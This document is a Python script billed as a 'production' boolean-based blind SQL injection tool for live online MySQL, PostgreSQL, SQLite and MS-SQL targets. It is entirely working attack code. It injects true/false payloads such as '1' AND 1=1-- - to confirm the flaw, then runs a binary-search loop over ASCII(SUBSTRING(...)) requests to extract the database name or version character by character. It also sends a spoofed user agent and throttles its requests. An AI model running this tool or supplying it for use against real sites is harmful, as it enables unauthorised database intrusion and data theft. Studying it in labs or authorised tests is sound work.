#!/usr/bin/env python3
"""
Project #9 (Production Build): Robust Boolean-Based Blind SQLi Scanner
Optimized for: Live online targets (MySQL/PostgreSQL) and local SQLite instances.
"""

import argparse
import sys
import time
import requests
import urllib.parse

BANNER = """
======================================================================
  PRODUCTION ENGINE: AUTOMATED BOOLEAN-BASED BLIND SQL INFERENCE
  Target Compatibility: MySQL, PostgreSQL, SQLite, MS-SQL
======================================================================
"""

# Establish session to maintain connections efficiently
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Cybersecurity-Audit-Engine/1.1"
})

def verify_target_behavior(url: str, param: str) -> tuple[bool, int, str]:
    """Analyzes differences in page responses using real URL encoding."""
    print("[*] Phase 1: Conducting structural differential analysis...")
    
    # 1. Baseline Request
    try:
        base_res = session.get(f"{url}?{param}=1", timeout=10)
        baseline_len = len(base_res.text)
    except Exception as e:
        print(f"❌ Target Unreachable: {e}")
        return False, 0, ""

    # 2. SQL Payloads tailored with comment blocks to handle production strings
    # Online engines require trailing comments (-- - or #) to break out of backend quotes
    true_payload = "1' AND 1=1-- -"
    false_payload = "1' AND 1=2-- -"

    # URL encode payloads safely to preserve special characters like spaces and quotes
    res_true = session.get(f"{url}?{param}={urllib.parse.quote(true_payload)}", timeout=10)
    res_false = session.get(f"{url}?{param}={urllib.parse.quote(false_payload)}", timeout=10)

    len_true = len(res_true.text)
    len_false = len(res_false.text)

    print(f"   [Data] Baseline: {baseline_len}B | TRUE State: {len_true}B | FALSE State: {len_false}B")

    # If TRUE page matches baseline, but FALSE page shrinks/changes -> Vulnerable
    if len_true != len_false and abs(len_true - baseline_len) < 20:
        print("🚨 VULNERABILITY CONFIRMED: Parameter is susceptible to injection.")
        return True, len_true, "1' AND {CONDITION}-- -"
        
    return False, 0, ""

def infer_sql_data(url: str, param: str, template: str, true_len: int):
    """Robust character extraction engine using precise length verification match."""
    print("\n[*] Phase 2: Deploying Binary Search extraction matrix...")
    
    # Check both MySQL/PostgreSQL standard (DATABASE()) and SQLite standard (sqlite_version())
    expressions = ["DATABASE()", "sqlite_version()"]
    
    for expr in expressions:
        extracted_string = ""
        print(f"   [Targeting Vector]: Enforcing extraction on {expr}")
        
        for char_index in range(1, 20):
            low = 32
            high = 126
            matched_char_ascii = 0

            while low <= high:
                mid = (low + high) // 2
                
                # Dynamic extraction syntax payload generation
                condition = f"ASCII(SUBSTRING({expr},{char_index},1))>{mid}"
                payload = template.replace("{CONDITION}", condition)
                
                try:
                    # Execute with strict URL encoding parsing
                    target_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = session.get(target_url, timeout=10)
                    time.sleep(0.1) # Controlled throttling
                except Exception:
                    continue

                # SUCCESS CRITERIA: Check if page structure matches the exact TRUE length state
                if len(response.text) == true_len:
                    low = mid + 1
                else:
                    matched_char_ascii = mid
                    high = mid - 1

            if matched_char_ascii == 32 or matched_char_ascii == 0:
                break

            actual_char = chr(matched_char_ascii + 1)
            extracted_string += actual_char
            print(f"      👉 Character {char_index} found: '{actual_char}' -> Current Data: {extracted_string}")

        if extracted_string:
            print(f"\n🎉 Extraction Complete! Extracted value for {expr}: {extracted_string}")
            return

if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser(description="Production SQLi Scanner")
    parser.add_argument("--url", required=True, help="Target path (e.g., http://127.0.0.1:5000/artists.php)")
    parser.add_argument("--param", required=True, help="Target query parameter (e.g., artist)")
    args = parser.parse_args()

    # Clean input check: protect users from accidentally appending parameters to the URL string
    clean_url = args.url.split('?')[0]

    is_vuln, true_length, working_template = verify_target_behavior(clean_url, args.param)
    if is_vuln:
        infer_sql_data(clean_url, args.param, working_template, true_length)
    else:
        print("[-] Target parameter did not exhibit distinct boolean differential qualities.")